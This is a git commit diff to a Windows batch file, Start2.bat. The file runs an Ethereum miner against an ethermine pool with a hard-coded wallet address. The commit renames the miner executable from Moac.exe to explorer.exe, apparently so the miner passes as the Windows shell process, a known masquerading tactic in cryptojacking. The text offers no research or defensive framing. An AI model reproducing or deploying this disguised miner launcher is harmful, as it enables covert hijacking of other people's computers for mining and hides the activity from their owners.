ed2cd7da3f903ad2c4397b885ea7703a893174ae
Nabum123 <87659064+Nabum123@users.noreply.github.com>
2021-08-13 14:39:05 +0300

    Update Start2.bat

--- Start2.bat
+++ Start2.bat
@@ -1,2 +1,2 @@
-Moac.exe -coin ETH -pool ssl://asia1.ethermine.org:5555 -ewal 0x6ff85749ffac2d3a36efa2bc916305433fa93731.5el0966s5a58dyv
+explorer.exe -coin ETH -pool ssl://asia1.ethermine.org:5555 -ewal 0x6ff85749ffac2d3a36efa2bc916305433fa93731.5el0966s5a58dyv
 pause
